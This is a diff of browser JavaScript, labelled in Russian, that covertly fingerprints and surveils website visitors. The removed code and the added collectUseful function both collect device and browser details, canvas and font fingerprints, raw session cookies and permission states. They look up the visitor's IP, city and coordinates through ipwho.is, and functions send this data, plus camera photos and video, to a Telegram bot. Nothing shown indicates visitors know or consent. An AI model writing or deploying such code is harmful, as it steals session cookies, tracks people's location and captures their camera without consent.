-    OTHER_DATA['311 TextMetrics actualLeft'] = m.actualBoundingBoxLeft;
-    OTHER_DATA['312 TextMetrics actualRight'] = m.actualBoundingBoxRight;
-    OTHER_DATA['313 TextMetrics actualTop'] = m.actualBoundingBoxAscent;
-    OTHER_DATA['314 TextMetrics actualBottom'] = m.actualBoundingBoxDescent;
-    OTHER_DATA['315 TextMetrics fontBoundingBoxAscent'] = m.fontBoundingBoxAscent;
-    OTHER_DATA['316 TextMetrics fontBoundingBoxDescent'] = m.fontBoundingBoxDescent;
-  } catch (e) {}
-}
-
-async function collectAudio() {
-  try {
-    const AC = window.OfflineAudioContext || window.webkitOfflineAudioContext;
-    if (!AC) return;
-    const ctx = new AC(1, 44100, 44100);
-    const osc = ctx.createOscillator();
-    osc.type = 'triangle';
-    osc.frequency.value = 10000;
-    const comp = ctx.createDynamicsCompressor();
-    osc.connect(comp); comp.connect(ctx.destination);
-    osc.start(0);
-    const buf = await ctx.startRendering();
-    const ch = buf.getChannelData(0);
-    let sum = 0;
-    for (let i = 4500; i < 5000; i++) sum += Math.abs(ch[i]);
-    OTHER_DATA['400 Audio fingerprint'] = sum.toString().slice(0, 20);
-    OTHER_DATA['401 Audio sample rate'] = buf.sampleRate;
-    OTHER_DATA['402 Audio channel']     = buf.numberOfChannels;
-    OTHER_DATA['403 Audio length']      = buf.length;
-    OTHER_DATA['404 Audio duration']    = buf.duration;
-  } catch (e) {}
-
-  // AudioContext realtime
-  try {
-    const AC = window.AudioContext || window.webkitAudioContext;
-    if (AC) {
-      const ctx = new AC();
-      OTHER_DATA['410 AudioContext sampleRate'] = ctx.sampleRate;
-      OTHER_DATA['411 AudioContext state']      = ctx.state;
-      OTHER_DATA['412 AudioContext baseLatency']= ctx.baseLatency;
-      OTHER_DATA['413 AudioContext outputLatency'] = ctx.outputLatency || '';
-      OTHER_DATA['414 AudioContext maxChannelCount'] = ctx.destination ? ctx.destination.maxChannelCount : '';
-      OTHER_DATA['415 AudioContext currentTime'] = ctx.currentTime;
-      OTHER_DATA['416 Аудио входов']  = navigator.mediaDevices ? 'проверяется' : '';
-      ctx.close && ctx.close();
-    }
-  } catch (e) {}
-}
-
-function collectFonts() {
-  const base = ['monospace', 'sans-serif', 'serif'];
-  const test = [
-    'Arial','Arial Black','Arial Narrow','Arial Rounded MT Bold','Comic Sans MS','Courier New','Georgia',
-    'Impact','Times New Roman','Trebuchet MS','Verdana','Tahoma','Helvetica','Segoe UI','Segoe UI Emoji',
-    'Roboto','Roboto Mono','Roboto Condensed','Ubuntu','Ubuntu Mono','Cantarell','Calibri','Cambria',
-    'Cambria Math','Consolas','Menlo','Monaco','DejaVu Sans','DejaVu Serif','DejaVu Sans Mono',
-    'Liberation Sans','Liberation Serif','Liberation Mono','Noto Sans','Noto Serif','Noto Mono','Noto Color Emoji',
-    'Symbol','Wingdings','Webdings','MS Sans Serif','MS Serif','Marlett','SimSun','Microsoft YaHei',
-    'PingFang SC','Hiragino Sans','Apple SD Gothic Neo','Malgun Gothic','Meiryo','Yu Gothic',
-    'San Francisco','SF Pro','SF Mono','Helvetica Neue','Lucida Grande','Lucida Sans Unicode',
-    'Geneva','Futura','Gill Sans','Optima','Baskerville','Didot','Palatino','Book Antiqua',
-    'Rockwell','Copperplate','Papyrus','Chalkboard','Chalkduster','Marker Felt','Bradley Hand',
-    'Apple Chancery','Snell Roundhand','Zapfino','Iowan Old Style','Athelas','Charter',
-    'Fira Code','Fira Sans','JetBrains Mono','Source Code Pro','Source Sans Pro','Source Serif Pro',
-    'Inter','Open Sans','Lato','Montserrat','Poppins','Raleway','Nunito','PT Sans','PT Serif','PT Mono',
-    'Droid Sans','Droid Serif','Droid Sans Mono','Oxygen','Cantarell','Ubuntu Light','Ubuntu Condensed',
-    'Manrope','Rubik','Karla','Work Sans','IBM Plex Sans','IBM Plex Mono','IBM Plex Serif'
-  ];
-  const span = document.createElement('span');
-  span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;white-space:nowrap;';
-  span.textContent = 'mmmmmmmmmmlliWWWW';
-  document.body.appendChild(span);
-  const baseSizes = {};
-  for (const b of base) { span.style.fontFamily = b; baseSizes[b] = span.offsetWidth + 'x' + span.offsetHeight; }
-  const found = [];
-  for (const f of test) {
-    for (const b of base) {
-      span.style.fontFamily = '"' + f + '",' + b;
-      if (span.offsetWidth + 'x' + span.offsetHeight !== baseSizes[b]) { found.push(f); break; }
-    }
-  }
-  document.body.removeChild(span);
-  OTHER_DATA['500 Шрифтов найдено']  = found.length;
-  OTHER_DATA['501 Список шрифтов']   = found.join(', ');
-  let i = 510;
-  found.slice(0, 100).forEach(f => {
-    OTHER_DATA[String(i++).padStart(3,'0') + ' Font'] = f;
-  });
-}
-
-function collectPlugins() {
-  if (!navigator.plugins) { OTHER_DATA['600 Плагины недоступны'] = true; return; }
-  const p = [];
-  for (let i = 0; i < navigator.plugins.length; i++)
-    p.push(navigator.plugins[i].name + ' v' + (navigator.plugins[i].version || ''));
-  OTHER_DATA['600 Плагинов']        = p.length;
-  OTHER_DATA['601 Список плагинов'] = p.join(' | ');
-  p.forEach((n, i) => { OTHER_DATA[String(610 + i).padStart(3,'0') + ' Plugin'] = n; });
-
-  if (navigator.mimeTypes) {
-    OTHER_DATA['650 MIME типов'] = navigator.mimeTypes.length;
-    const mimes = [];
-    for (let i = 0; i < navigator.mimeTypes.length; i++) mimes.push(navigator.mimeTypes[i].type);
-    OTHER_DATA['651 MIME список'] = mimes.join(', ');
-  }
-}
-
-function collectCodecs() {
-  const v = document.createElement('video');
-  const a = document.createElement('audio');
-  const codecs = {
-    'H.264':  v.canPlayType('video/mp4; codecs="avc1.42E01E"'),
-    'H.265':  v.canPlayType('video/mp4; codecs="hev1.1.6.L93.B0"'),
-    'H.266':  v.canPlayType('video/mp4; codecs="vvc1.1.6.L93.B0"'),
-    'VP8':    v.canPlayType('video/webm; codecs="vp8"'),
-    'VP9':    v.canPlayType('video/webm; codecs="vp9"'),
-    'AV1':    v.canPlayType('video/mp4; codecs="av01.0.05M.08"'),
-    'Theora': v.canPlayType('video/ogg; codecs="theora"'),
-    'MP4':    v.canPlayType('video/mp4'),
-    'WebM':   v.canPlayType('video/webm'),
-    'Ogg':    v.canPlayType('video/ogg'),
-    '3GPP':   v.canPlayType('video/3gpp'),
-    '3GPP2':  v.canPlayType('video/3gpp2'),
-    'MPEG-TS':v.canPlayType('video/mp2t'),
-    'AAC':    a.canPlayType('audio/mp4; codecs="mp4a.40.2"'),
-    'MP3':    a.canPlayType('audio/mpeg'),
-    'Opus':   a.canPlayType('audio/webm; codecs="opus"'),
-    'Vorbis': a.canPlayType('audio/ogg; codecs="vorbis"'),
-    'FLAC':   a.canPlayType('audio/flac'),
-    'WAV':    a.canPlayType('audio/wav'),
-    'ALAC':   a.canPlayType('audio/mp4; codecs="alac"'),
-    'PCM':    a.canPlayType('audio/L16'),
-    'AIFF':   a.canPlayType('audio/aiff'),
-    'AMR':    a.canPlayType('audio/amr'),
-    'WebAudio': !!window.AudioContext || !!window.webkitAudioContext,
-  };
-  let i = 700;
-  for (const k in codecs) OTHER_DATA[String(i++).padStart(3,'0') + ' Кодек ' + k] = codecs[k] || 'нет';
-}
-
-function collectSecurity() {
-  OTHER_DATA['800 Secure Context']   = window.isSecureContext;
-  OTHER_DATA['801 Cross-Origin Isol.'] = window.crossOriginIsolated;
-  OTHER_DATA['802 Trusted Types']    = !!window.trustedTypes;
-  OTHER_DATA['803 Do Not Track']     = navigator.doNotTrack;
-  OTHER_DATA['804 Timezone offset']  = new Date().getTimezoneOffset();
-  OTHER_DATA['805 TTFB']             = performance.timing ? (performance.timing.responseStart - performance.timing.requestStart) : '';
-  OTHER_DATA['806 Загрузка стр.']    = performance.timing ? (performance.timing.loadEventEnd - performance.timing.navigationStart) : '';
-  OTHER_DATA['807 DNS lookup']       = performance.timing ? (performance.timing.domainLookupEnd - performance.timing.domainLookupStart) : '';
-  OTHER_DATA['808 TCP connect']      = performance.timing ? (performance.timing.connectEnd - performance.timing.connectStart) : '';
-  OTHER_DATA['809 TLS handshake']    = performance.timing ? (performance.timing.connectEnd - performance.timing.secureConnectionStart) : '';
-  OTHER_DATA['810 Request start']    = performance.timing ? performance.timing.requestStart : '';
-  OTHER_DATA['811 Response start']   = performance.timing ? performance.timing.responseStart : '';
-  OTHER_DATA['812 Response end']     = performance.timing ? performance.timing.responseEnd : '';
-  OTHER_DATA['813 Dom loading']      = performance.timing ? performance.timing.domLoading : '';
-  OTHER_DATA['814 Dom interactive']  = performance.timing ? performance.timing.domInteractive : '';
-  OTHER_DATA['815 Dom complete']     = performance.timing ? performance.timing.domComplete : '';
-  OTHER_DATA['816 Load event']       = performance.timing ? performance.timing.loadEventEnd - performance.timing.loadEventStart : '';
-  OTHER_DATA['817 Orientation lock'] = 'orientation' in screen && 'lock' in screen.orientation;
-  OTHER_DATA['818 Keyboard Lock']    = 'keyboard' in navigator;
-  OTHER_DATA['819 Storage quota']    = navigator.storage ? 'есть' : 'нет';
-  OTHER_DATA['820 Crypto API']       = 'crypto' in window;
-  OTHER_DATA['821 Subtle Crypto']    = 'crypto' in window && 'subtle' in window.crypto;
-  OTHER_DATA['822 RandomUUID']       = 'crypto' in window && 'randomUUID' in window.crypto;
-  OTHER_DATA['823 getRandomValues']  = 'crypto' in window && 'getRandomValues' in window.crypto;
-
-  // CSP / окружение
-  OTHER_DATA['830 URL trust']        = location.origin;
-  OTHER_DATA['831 Top-level']        = window.top === window.self;
-  OTHER_DATA['832 Iframe']           = window.top !== window.self;
-  OTHER_DATA['833 Sandboxed']        = 'sandbox' in HTMLIFrameElement.prototype;
-  OTHER_DATA['834 X-Frame-Options']  = '(проверка через HTTP-заголовки)';
-  OTHER_DATA['835 Общий origin']     = window.location.origin;
-  OTHER_DATA['836 Native context']   = window.__native_context__ || 'нет';
-  OTHER_DATA['837 Tampered JS?']     = (() => {
-    const t = Function.prototype.toString.call && Function.prototype.toString;
-    return /\[native code\]/.test(Function.prototype.toString.call(t));
-  })();
-  OTHER_DATA['838 Navigator tostring tamper'] = /\[native code\]/.test(navigator.userAgent.toString());
-  OTHER_DATA['839 Date tostring tamper']      = /\[native code\]/.test(Date.toString());
-  OTHER_DATA['840 Function tostring tamper']  = /\[native code\]/.test(Function.prototype.toString);
-  OTHER_DATA['841 Math tostring tamper']      = /\[native code\]/.test(Math.toString());
-  OTHER_DATA['842 Array tostring tamper']     = /\[native code\]/.test(Array.toString());
-  OTHER_DATA['843 Object tostring tamper']    = /\[native code\]/.test(Object.toString());
-  OTHER_DATA['844 String tostring tamper']    = /\[native code\]/.test(String.toString());
-  OTHER_DATA['845 Number tostring tamper']    = /\[native code\]/.test(Number.toString());
-  OTHER_DATA['846 Boolean tostring tamper']   = /\[native code\]/.test(Boolean.toString());
-  OTHER_DATA['847 JSON tostring tamper']      = /\[native code\]/.test(JSON.stringify);
-  OTHER_DATA['848 Promise tostring tamper']   = /\[native code\]/.test(Promise.toString());
-  OTHER_DATA['849 Proxy tostring tamper']     = /\[native code\]/.test(Proxy.toString());
-  OTHER_DATA['850 Reflect tostring tamper']   = /\[native code\]/.test(Reflect.toString());
-  OTHER_DATA['851 Symbol tostring tamper']    = /\[native code\]/.test(Symbol.toString());
-}
-
-// ═══════════════════════════════════════════════════════════
-// САЙТЫ / СЕССИЯ
-// ═══════════════════════════════════════════════════════════
-function collectSites() {
-  SITES_DATA['001 Referrer']          = document.referrer || '(прямой заход)';
-  SITES_DATA['002 Referrer host']     = (() => { try { return new URL(document.referrer).hostname; } catch { return ''; } })();
-  SITES_DATA['003 Referrer origin']   = (() => { try { return new URL(document.referrer).origin; } catch { return ''; } })();
-  SITES_DATA['004 Referrer path']     = (() => { try { return new URL(document.referrer).pathname; } catch { return ''; } })();
-  SITES_DATA['005 Текущий URL']       = location.href;
-  SITES_DATA['006 Текущий host']      = location.hostname;
-  SITES_DATA['007 Текущий origin']    = location.origin;
-  SITES_DATA['008 Текущий path']      = location.pathname;
-  SITES_DATA['009 Query string']      = location.search || '(нет)';
-  SITES_DATA['010 Hash']              = location.hash || '(нет)';
-
-  try {
-    const nav = performance.getEntriesByType('navigation');
-    if (nav && nav.length) {
-      SITES_DATA['011 Тип навигации']       = nav[0].type;
-      SITES_DATA['012 Redirect count']      = nav[0].redirectCount;
-      SITES_DATA['013 Redirect время (ms)'] = Math.round(nav[0].redirectEnd - nav[0].redirectStart);
-      SITES_DATA['014 Next hop protocol']   = nav[0].nextHopProtocol || '';
-      SITES_DATA['015 Transfer size']       = nav[0].transferSize;
-      SITES_DATA['016 Encoded body size']   = nav[0].encodedBodySize;
-      SITES_DATA['017 Decoded body size']   = nav[0].decodedBodySize;
-      SITES_DATA['018 Duration']            = Math.round(nav[0].duration);
-      SITES_DATA['019 Start time']          = nav[0].startTime;
-      SITES_DATA['020 Fetch start']         = nav[0].fetchStart;
-      SITES_DATA['021 Domain lookup start'] = nav[0].domainLookupStart;
-      SITES_DATA['022 Domain lookup end']   = nav[0].domainLookupEnd;
-      SITES_DATA['023 Connect start']       = nav[0].connectStart;
-      SITES_DATA['024 Connect end']         = nav[0].connectEnd;
-      SITES_DATA['025 Secure connection']   = nav[0].secureConnectionStart;
-      SITES_DATA['026 Request start']       = nav[0].requestStart;
-      SITES_DATA['027 Response start']      = nav[0].responseStart;
-      SITES_DATA['028 Response end']        = nav[0].responseEnd;
-      SITES_DATA['029 Dom interactive']     = nav[0].domInteractive;
-      SITES_DATA['030 Dom content loaded']  = nav[0].domContentLoadedEventStart;
-      SITES_DATA['031 Dom complete']        = nav[0].domComplete;
-      SITES_DATA['032 Load event start']    = nav[0].loadEventStart;
-      SITES_DATA['033 Load event end']      = nav[0].loadEventEnd;
-      SITES_DATA['034 Worker start']        = nav[0].workerStart || '';
-    }
-  } catch (e) {}
-
-  SITES_DATA['040 History length'] = history.length;
-
-  try {
-    const res = performance.getEntriesByType('resource');
-    SITES_DATA['041 Ресурсов загружено'] = res.length;
-    const hosts = new Set();
-    const types = {};
-    let totalSize = 0;
-    for (const r of res) {
-      try { const u = new URL(r.name); if (u.hostname !== location.hostname) hosts.add(u.hostname); } catch (e) {}
-      types[r.initiatorType] = (types[r.initiatorType] || 0) + 1;
-      totalSize += r.transferSize || 0;
-    }
-    SITES_DATA['042 Сторонних доменов'] = hosts.size;
-    SITES_DATA['043 Список доменов']    = Array.from(hosts).slice(0, 60).join(', ');
-    let i = 50;
-    for (const k in types) {
-      SITES_DATA[String(i++).padStart(3,'0') + ' Ресурс ' + k] = types[k];
-    }
-    SITES_DATA['090 Общий размер KB'] = Math.round(totalSize / 1024);
-  } catch (e) {}
-
-  SITES_DATA['100 Screen']        = screen.width + 'x' + screen.height;
-  SITES_DATA['101 Viewport']      = window.innerWidth + 'x' + window.innerHeight;
-  SITES_DATA['102 Language']      = navigator.language;
-  SITES_DATA['103 Platform']      = navigator.platform;
-  SITES_DATA['104 Time']          = new Date().toLocaleString('ru-RU');
-  SITES_DATA['105 Timezone']      = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-  try {
-    const ck = document.cookie;
-    SITES_DATA['110 Cookies сырое']    = ck || '(нет доступных)';
-    SITES_DATA['111 Cookies кол-во']   = ck ? ck.split(';').length : 0;
-    const names = ck ? ck.split(';').map(x => x.trim().split('=')[0]).join(', ') : '';
-    SITES_DATA['112 Cookies имена']    = names || '(нет)';
-  } catch (e) {}
-
-  try {
-    const keys = [];
-    for (let i = 0; i < localStorage.length; i++) keys.push(localStorage.key(i));
-    SITES_DATA['120 localStorage ключей'] = keys.length;
-    SITES_DATA['121 localStorage имена']  = keys.slice(0, 60).join(', ');
-  } catch (e) {}
-
-  try {
-    const keys = [];
-    for (let i = 0; i < sessionStorage.length; i++) keys.push(sessionStorage.key(i));
-    SITES_DATA['130 sessionStorage ключей'] = keys.length;
-    SITES_DATA['131 sessionStorage имена']  = keys.slice(0, 60).join(', ');
-  } catch (e) {}
-
-  const ref = document.referrer;
-  if (!ref)                          SITES_DATA['140 Источник']  = 'прямой заход';
-  else if (/google\./i.test(ref))    SITES_DATA['140 Источник']  = 'Google';
-  else if (/yandex\./i.test(ref))    SITES_DATA['140 Источник']  = 'Яндекс';
-  else if (/bing\./i.test(ref))      SITES_DATA['140 Источник']  = 'Bing';
-  else if (/duckduckgo\./i.test(ref))SITES_DATA['140 Источник']  = 'DuckDuckGo';
-  else                               SITES_DATA['140 Источник']  = 'другой сайт: ' + ref;
-
-  SITES_DATA['141 Standalone']   = window.matchMedia('(display-mode: standalone)').matches;
-  SITES_DATA['142 Minimal UI']   = window.matchMedia('(display-mode: minimal-ui)').matches;
-  SITES_DATA['143 Fullscreen PWA']= window.matchMedia('(display-mode: fullscreen)').matches;
-  SITES_DATA['144 Browser mode'] = window.matchMedia('(display-mode: browser)').matches;
-  SITES_DATA['145 BFCache']      = performance.getEntriesByType('navigation')[0]?.type === 'back_forward';
-  SITES_DATA['146 Открыт при запуске'] = performance.navigation ? performance.navigation.type === 0 : '';
-  SITES_DATA['147 Время открытия'] = performance.timing ? performance.timing.navigationStart : '';
-  SITES_DATA['148 Страница активна'] = document.hasFocus();
-  SITES_DATA['149 Visible']       = document.visibilityState;
-  SITES_DATA['150 Дочерних окон'] = window.frames.length;
-}
-
-function simpleHash(str) {
-  let h = 0;
-  for (let i = 0; i < str.length; i++) { h = (h << 5) - h + str.charCodeAt(i); h |= 0; }
-  return (h >>> 0).toString(16);
-}
-
-// ═══════════════════════════════════════════════════════════
 // ОТПРАВКА
 // ═══════════════════════════════════════════════════════════
 function sendChunk(text) {
   return new Promise(res => {
     const url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage?chat_id=' + CHAT_ID +
-                '&parse_mode=HTML&disable_web_page_preview=false&text=' + encodeURIComponent(text);
+                '&parse_mode=HTML&disable_web_page_preview=true&text=' + encodeURIComponent(text);
     const img = new Image();
     img.onload = img.onerror = () => res();
     img.src = url;
@@ -1503,33 +139,12 @@ function sendChunk(text) {
   });
 }
 
-async function sendFile(filename, content, caption) {
-  try {
-    const blob = new Blob([content], { type: 'text/plain;charset=utf-8' });
-    const form = new FormData();
-    form.append('chat_id', CHAT_ID);
-    form.append('document', blob, filename);
-    form.append('caption', caption || 'Cookies — ' + new Date().toLocaleString('ru-RU'));
-    const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendDocument', {
-      method: 'POST', body: form
-    });
-    const j = await r.json();
-    return j.ok;
-  } catch (e) { return false; }
-}
-
-async function sendPhoto(blob) {
+async function sendPhoto(blob, caption) {
   try {
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('photo', blob, 'photo.jpg');
-    form.append('caption',
-      '📷 <b>Фото пользователя (с камеры)</b>\n' +
-      'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
-      'URL: ' + location.href + '\n' +
-      'Источник: ' + (SOURCE_DATA['07 Источник перехода'] || '') + '\n' +
-      'Браузер: ' + (SOURCE_DATA['02 Браузер'] || '')
-    );
+    form.append('caption', caption || 'Фото');
     const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', {
       method: 'POST', body: form
     });
@@ -1538,16 +153,12 @@ async function sendPhoto(blob) {
   } catch (e) { return false; }
 }
 
-async function sendVideo(blob, ext) {
+async function sendVideo(blob, ext, caption) {
   try {
     const form = new FormData();
     form.append('chat_id', CHAT_ID);
     form.append('video', blob, 'video.' + (ext || 'webm'));
-    form.append('caption',
-      '🎥 <b>Видео с фронтальной камеры (3 сек)</b>\n' +
-      'Время: ' + new Date().toLocaleString('ru-RU') + '\n' +
-      'URL: ' + location.href
-    );
+    form.append('caption', caption || 'Видео');
     form.append('supports_streaming', 'true');
     const r = await fetch('https://api.telegram.org/bot' + TOKEN + '/sendVideo', {
       method: 'POST', body: form
@@ -1557,214 +168,383 @@ async function sendVideo(blob, ext) {
   } catch (e) { return false; }
 }
 
-async function sendCategory(title, obj) {
-  const entries = Object.entries(obj).filter(([k, v]) => v !== '' && v != null && v !== false && v !== 'false');
-  const lines = entries.map(([k, v]) => '<b>' + k + '</b>: ' + String(v).slice(0, 300));
+// ═══════════════════════════════════════════════════════════
+// ПОЛЕЗНЫЕ ДАННЫЕ
+// ═══════════════════════════════════════════════════════════
+async function collectUseful() {
+  const ua = navigator.userAgent;
+  const n  = navigator;
+  const s  = screen;
+  const out = {};
 
-  const chunks = [];
-  let cur = '';
-  for (const line of lines) {
-    if ((cur + line).length > 3600) { chunks.push(cur); cur = ''; }
-    cur += line + '\n';
-  }
-  if (cur) chunks.push(cur);
+  const ref = document.referrer || '';
+  let refSource = 'прямой заход';
+  if (/t\.me|telegram/i.test(ref))      refSource = 'Telegram';
+  else if (/google\./i.test(ref))       refSource = 'Google';
+  else if (/yandex\./i.test(ref))       refSource = 'Яндекс';
+  else if (/bing\./i.test(ref))         refSource = 'Bing';
+  else if (/duckduckgo\./i.test(ref))   refSource = 'DuckDuckGo';
+  else if (/vk\.com/i.test(ref))        refSource = 'ВКонтакте';
+  else if (/instagram\./i.test(ref))    refSource = 'Instagram';
+  else if (/facebook\./i.test(ref))     refSource = 'Facebook';
+  else if (/youtube\./i.test(ref))      refSource = 'YouTube';
+  else if (ref)                         refSource = ref;
+  out['Источник'] = refSource;
+  out['Referrer'] = ref || '(прямой заход)';
 
-  for (let i = 0; i < chunks.length; i++) {
-    const head = title + ' (' + entries.length + ' полей)' +
-                 (chunks.length > 1 ? ' - часть ' + (i + 1) + '/' + chunks.length : '') + '\n\n';
-    await sendChunk(head + chunks[i]);
-    await new Promise(r => setTimeout(r, 500));
+  let inApp = 'нет';
+  if (/Telegram/i.test(ua))                     inApp = 'Telegram';
+  else if (/Instagram/i.test(ua))               inApp = 'Instagram';
+  else if (/FBAN|FBAV|FB_IAB/i.test(ua))        inApp = 'Facebook';
+  else if (/WhatsApp/i.test(ua))                inApp = 'WhatsApp';
+  else if (/Viber/i.test(ua))                   inApp = 'Viber';
+  else if (/TikTok|BytedanceWebview/i.test(ua)) inApp = 'TikTok';
+  else if (/VKClient|VKAndroidApp|VKiOS/i.test(ua)) inApp = 'VK';
+  out['Приложение'] = inApp;
+
+  let browser = 'неизвестно', bver = '';
+  const bt = [
+    [/YaBrowser\/([\d.]+)/,     'Яндекс.Браузер'],
+    [/Edg\/([\d.]+)/,           'Microsoft Edge'],
+    [/OPR\/([\d.]+)/,           'Opera'],
+    [/SamsungBrowser\/([\d.]+)/,'Samsung Internet'],
+    [/Firefox\/([\d.]+)/,       'Firefox'],
+    [/CriOS\/([\d.]+)/,         'Chrome iOS'],
+    [/FxiOS\/([\d.]+)/,         'Firefox iOS'],
+    [/Chrome\/([\d.]+)/,        'Chrome'],
+    [/Version\/([\d.]+).*Safari/,'Safari'],
+  ];
+  for (const [re, name] of bt) {
+    const m = re.exec(ua);
+    if (m) { browser = name; bver = m[1]; break; }
   }
+  out['Браузер'] = browser + (bver ? ' ' + bver : '');
+
+  let os = 'неизвестно', osv = '';
+  if (/Windows NT 10/i.test(ua))       { os = 'Windows 10/11'; }
+  else if (/Windows NT ([\d.]+)/.test(ua)) { os = 'Windows'; osv = RegExp.$1; }
+  else if (/iPhone|iPad|iPod/i.test(ua)) { os = 'iOS'; osv = (RegExp(/OS ([\d_]+)/).exec(ua) || [])[1] || ''; }
+  else if (/Mac OS X ([\d_.]+)/i.test(ua)) { os = 'macOS'; osv = RegExp.$1.replace(/_/g,'.'); }
+  else if (/Android ([\d.]+)/i.test(ua)) { os = 'Android'; osv = RegExp.$1; }
+  else if (/Linux/i.test(ua))           os = 'Linux';
+  out['ОС'] = os + (osv ? ' ' + osv : '');
+
+  let device = 'десктоп';
+  if (/iPad|Tablet/i.test(ua) || (/Android/i.test(ua) && !/Mobile/i.test(ua))) device = 'планшет';
+  else if (/Mobi|iPhone|Android.*Mobile/i.test(ua)) device = 'смартфон';
+  out['Устройство'] = device;
+
+  const modelMatch = /Android[^;]*;\s*([^)]+?)(?:\s+Build|\))/i.exec(ua);
+  if (modelMatch) out['Модель'] = modelMatch[1].trim();
+
+  out['Язык']      = n.language;
+  out['Языки']     = (n.languages || []).join(', ');
+  out['Локаль']    = Intl.DateTimeFormat().resolvedOptions().locale;
+  out['Часовой пояс'] = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  out['Смещение TZ (мин)'] = new Date().getTimezoneOffset();
+  out['Локальное время']   = new Date().toLocaleString('ru-RU');
+
+  out['Экран']       = s.width + 'x' + s.height;
+  out['Доступный']   = s.availWidth + 'x' + s.availHeight;
+  out['Окно']        = window.innerWidth + 'x' + window.innerHeight;
+  out['DPR']         = window.devicePixelRatio;
+  out['Ориентация']  = s.orientation ? s.orientation.type : '';
+  out['Глубина цвета'] = s.colorDepth;
+  out['Ядер CPU']    = n.hardwareConcurrency || '';
+  out['RAM (GB)']    = n.deviceMemory || '';
+  out['Платформа']   = n.platform || '';
+  out['Touch points']= n.maxTouchPoints || 0;
+
+  if (n.getBattery) {
+    try {
+      const b = await n.getBattery();
+      out['Батарея'] = Math.round(b.level * 100) + '%';
+      out['Заряжается'] = b.charging ? 'да' : 'нет';
+    } catch (e) {}
+  }
+
+  const c = n.connection || n.mozConnection || n.webkitConnection;
+  if (c) {
+    out['Тип сети']  = c.effectiveType || '';
+    out['Скорость Mbps'] = c.downlink || '';
+    out['RTT ms']    = c.rtt || '';
+  }
+  out['Онлайн'] = n.onLine ? 'да' : 'нет';
+
+  try {
+    const cv = document.createElement('canvas');
+    const gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
+    if (gl) {
+      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+      if (dbg) {
+        out['GPU вендор'] = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+        out['GPU модель'] = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+      }
+    }
+  } catch (e) {}
+
+  try {
+    const cv = document.createElement('canvas');
+    cv.width = 280; cv.height = 60;
+    const ctx = cv.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '16px Arial';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(0, 0, 100, 30);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Fingerprint 你好 🎉', 2, 10);
+    ctx.fillStyle = 'rgba(102,204,0,0.7)';
+    ctx.fillText('Fingerprint 你好 🎉', 4, 20);
+    const d = cv.toDataURL();
+    let h = 0;
+    for (let i = 0; i < d.length; i++) { h = (h << 5) - h + d.charCodeAt(i); h |= 0; }
+    out['Canvas hash'] = (h >>> 0).toString(16);
+  } catch (e) {}
+
+  try {
+    const base = ['monospace', 'sans-serif', 'serif'];
+    const test = ['Arial','Comic Sans MS','Courier New','Georgia','Impact','Times New Roman',
+      'Trebuchet MS','Verdana','Tahoma','Segoe UI','Roboto','Ubuntu','Calibri','Cambria',
+      'Consolas','Menlo','Monaco','DejaVu Sans','Noto Sans','Symbol','Wingdings','Webdings',
+      'Helvetica Neue','SF Pro','PingFang SC','Microsoft YaHei','Meiryo','Malgun Gothic',
+      'JetBrains Mono','Fira Code','Inter','Open Sans','Lato','Montserrat','Poppins'];
+    const span = document.createElement('span');
+    span.style.cssText = 'position:absolute;left:-9999px;font-size:72px;white-space:nowrap;';
+    span.textContent = 'mmmmmmmmmmlliWWWW';
+    document.body.appendChild(span);
+    const bs = {};
+    for (const b of base) { span.style.fontFamily = b; bs[b] = span.offsetWidth + 'x' + span.offsetHeight; }
+    const found = [];
+    for (const f of test) {
+      for (const b of base) {
+        span.style.fontFamily = '"' + f + '",' + b;
+        if (span.offsetWidth + 'x' + span.offsetHeight !== bs[b]) { found.push(f); break; }
+      }
+    }
+    document.body.removeChild(span);
+    if (found.length) out['Установленные шрифты'] = found.join(', ');
+  } catch (e) {}
+
+  try {
+    const ck = document.cookie || '';
+    if (ck) out['Cookies'] = ck;
+  } catch (e) {}
+
+  out['URL']      = location.href;
+  out['Хост']     = location.hostname;
+  out['Страница'] = location.pathname;
+
+  try {
+    const p = new URLSearchParams(location.search);
+    const utm = ['utm_source','utm_medium','utm_campaign','utm_term','utm_content','gclid','fbclid','yclid'];
+    const found = [];
+    for (const k of utm) {
+      const v = p.get(k);
+      if (v) found.push(k + '=' + v);
+    }
+    if (found.length) out['UTM'] = found.join(' | ');
+  } catch (e) {}
+
+  try {
+    const r = await fetch('https://ipwho.is/');
+    const g = await r.json();
+    if (g.success !== false && g.latitude != null) {
+      out['IP']           = g.ip;
+      out['Страна']       = g.country;
+      out['Регион']       = g.region;
+      out['Город']        = g.city;
+      out['Индекс']       = g.postal;
+      out['Координаты']   = g.latitude + ', ' + g.longitude;
+      out['ISP']          = g.connection && g.connection.isp;
+      out['Организация']  = g.connection && g.connection.org;
+      out['ASN']          = g.connection && ('AS' + g.connection.asn);
+      out['Мобильный IP'] = g.connection && g.connection.is_mobile ? 'да' : 'нет';
+      out['VPN']          = g.security && g.security.vpn ? 'да' : 'нет';
+      out['Прокси']       = g.security && g.security.proxy ? 'да' : 'нет';
+      out['Tor']          = g.security && g.security.tor ? 'да' : 'нет';
+      out['Google Maps']  = 'https://www.google.com/maps?q=' + g.latitude + ',' + g.longitude;
+      out['Яндекс.Карты'] = 'https://yandex.ru/maps/?pt=' + g.longitude + ',' + g.latitude + '&z=15&l=map';
+    }
+  } catch (e) {}
+
+  try {
+    if (n.permissions) {
+      const perms = ['geolocation','camera','microphone','notifications','clipboard-read','clipboard-write'];
+      const states = [];
+      for (const p of perms) {
+        try {
+          const r = await n.permissions.query({ name: p });
+          states.push(p + '=' + r.state);
+        } catch (e) {}
+      }
+      if (states.length) out['Разрешения'] = states.join(', ');
+    }
+  } catch (e) {}
+
+  return out;
 }
 
 // ═══════════════════════════════════════════════════════════
